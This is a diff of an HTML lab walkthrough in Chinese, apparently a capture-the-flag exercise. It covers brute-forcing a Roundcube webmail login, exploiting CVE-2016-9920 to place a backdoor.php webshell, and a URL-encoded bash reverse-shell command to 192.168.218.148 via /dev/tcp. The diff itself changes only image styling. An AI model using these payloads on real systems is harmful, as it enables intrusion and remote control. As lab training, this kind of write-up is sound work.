@@ -134,7 +134,7 @@ MAC Address: 00:0C:29:80:1A:A4 (VMware)
 </code></pre>
 <p>靶机非常任性，ssh端口干脆不开了，IMAP目前还没有什么信息，先放着。</p>
 <h2>基本信息枚举</h2>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/5d08e051-1da6-4e2b-b8b1-bd1ea4b8e04d"><img width="1919" height="950" alt="Image" src="https://github.com/user-attachments/assets/5d08e051-1da6-4e2b-b8b1-bd1ea4b8e04d" style="max-width: 100%; height: auto; max-height: 950px;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/5d08e051-1da6-4e2b-b8b1-bd1ea4b8e04d"><img width="1919" height="950" alt="Image" src="https://github.com/user-attachments/assets/5d08e051-1da6-4e2b-b8b1-bd1ea4b8e04d" style="max-width: 100%; height: auto; max-height: 950px;; aspect-ratio: 1919 / 950; background-color: var(--bgColor-muted); border-radius: 6px; display: block" class="js-gh-image-fallback"></a></p>
 <p>80端口是一个倒计时，根据靶机表述，该黑客组织中有人使用弱密码，主页中有昵称收集起来。</p>
 <p>爆破一下目录</p>
 <pre class="notranslate"><code class="notranslate">/images               (Status: 301) [Size: 319] [--&gt; http://192.168.218.220/images/]
@@ -167,15 +167,15 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-11-26 21:32:
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-11-26 22:10:12
 </code></pre>
 <p>我嘞个弱密码，爆了我一个小时。</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/76dc993f-9eb6-40e5-b2a6-ef7294da2078"><img width="1917" height="950" alt="Image" src="https://github.com/user-attachments/assets/76dc993f-9eb6-40e5-b2a6-ef7294da2078" style="max-width: 100%; height: auto; max-height: 950px;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/76dc993f-9eb6-40e5-b2a6-ef7294da2078"><img width="1917" height="950" alt="Image" src="https://github.com/user-attachments/assets/76dc993f-9eb6-40e5-b2a6-ef7294da2078" style="max-width: 100%; height: auto; max-height: 950px;; aspect-ratio: 1917 / 950; background-color: var(--bgColor-muted); border-radius: 6px; display: block" class="js-gh-image-fallback"></a></p>
 <p>还来。</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/34722813-8ee7-4c9c-b45b-6f3d1000b332"><img width="1919" height="930" alt="Image" src="https://github.com/user-attachments/assets/34722813-8ee7-4c9c-b45b-6f3d1000b332" style="max-width: 100%; height: auto; max-height: 930px;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/34722813-8ee7-4c9c-b45b-6f3d1000b332"><img width="1919" height="930" alt="Image" src="https://github.com/user-attachments/assets/34722813-8ee7-4c9c-b45b-6f3d1000b332" style="max-width: 100%; height: auto; max-height: 930px;; aspect-ratio: 1919 / 930; background-color: var(--bgColor-muted); border-radius: 6px; display: block" class="js-gh-image-fallback"></a></p>
 <p>还好可以使用刚刚的用户名密码登录</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/c4add13b-f738-4e15-8ffe-271c924e260c"><img width="1919" height="917" alt="Image" src="https://github.com/user-attachments/assets/c4add13b-f738-4e15-8ffe-271c924e260c" style="max-width: 100%; height: auto; max-height: 917px;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/c4add13b-f738-4e15-8ffe-271c924e260c"><img width="1919" height="917" alt="Image" src="https://github.com/user-attachments/assets/c4add13b-f738-4e15-8ffe-271c924e260c" style="max-width: 100%; height: auto; max-height: 917px;; aspect-ratio: 1919 / 917; background-color: var(--bgColor-muted); border-radius: 6px; display: block" class="js-gh-image-fallback"></a></p>
 <p>发现一个邮件，是ssh的密钥，但是考虑到ssh端口好像并没有开放。</p>
 <h1>漏洞利用</h1>
 <p>大概率就是roundcube的shell入口了，找找命令执行漏洞</p>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/8e07aa05-62ab-4511-ab0f-3d9055de1635"><img width="1897" height="561" alt="Image" src="https://github.com/user-attachments/assets/8e07aa05-62ab-4511-ab0f-3d9055de1635" style="max-width: 100%; height: auto; max-height: 561px;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/8e07aa05-62ab-4511-ab0f-3d9055de1635"><img width="1897" height="561" alt="Image" src="https://github.com/user-attachments/assets/8e07aa05-62ab-4511-ab0f-3d9055de1635" style="max-width: 100%; height: auto; max-height: 561px;; aspect-ratio: 1897 / 561; background-color: var(--bgColor-muted); border-radius: 6px; display: block" class="js-gh-image-fallback"></a></p>
 <p>其他的太古早了，感觉就是第一个。<br>
 利用起来很简单，但是不知道文件绝对路径，猜一下应该是 <strong>/var/www/html/zmail</strong> 然后试着试着靶机就到期了，只能重新开一把，能三个小时打完真是大手子啊。</p>
 <p>手工打了一会没成功，搜到了<a href="https://github.com/t0kx/exploit-CVE-2016-9920">利用脚本</a>，但是登录前面还有一层校验，让ai修改了一下脚本。</p>
@@ -187,7 +187,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-11-26 22:10:
 [+] Running whoami: www-data
 [+] Done
 </code></pre>
-<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/d5b8f70d-21d8-4a26-8ce2-82e19f6217e6"><img width="1919" height="578" alt="Image" src="https://github.com/user-attachments/assets/d5b8f70d-21d8-4a26-8ce2-82e19f6217e6" style="max-width: 100%; height: auto; max-height: 578px;"></a></p>
+<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/d5b8f70d-21d8-4a26-8ce2-82e19f6217e6"><img width="1919" height="578" alt="Image" src="https://github.com/user-attachments/assets/d5b8f70d-21d8-4a26-8ce2-82e19f6217e6" style="max-width: 100%; height: auto; max-height: 578px;; aspect-ratio: 1919 / 578; background-color: var(--bgColor-muted); border-radius: 6px; display: block" class="js-gh-image-fallback"></a></p>
 <p><code class="notranslate">http://192.168.218.221/zmail/backdoor.php?cmd=/usr/bin/bash+-c+%27bash+-i+%3E%26+/dev/tcp/192.168.218.148/80+0%3E%261%27</code></p>
 <p>成功反弹回来shell。</p>
 <h1>提权</h1>
